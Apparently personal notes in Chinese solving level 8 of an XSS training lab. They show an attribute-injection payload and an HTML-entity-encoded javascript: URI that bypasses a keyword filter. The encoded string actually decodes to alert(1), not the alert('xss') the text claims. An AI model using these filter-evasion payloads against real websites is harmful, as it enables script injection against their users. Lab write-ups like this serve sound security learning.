添加的友情链接会到

input标签里。

注入

```
" onfocus=javascript:alert('xss')  "
```

用浏览器开发者工具看 

![](/home/de0xy/Documents/penetration/web/Xss/Xss-Exercises/do0dl3-xss-labs
/images/level8-1.png)

这里

`on`   `javascript` 都被加了个`_`



href已经有了，里面只要写javascript:alert('xss'); 就好了.



这里采用编码绕过

这里用unicode编码

`javascript:alert('xss');`

得到

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```



过关
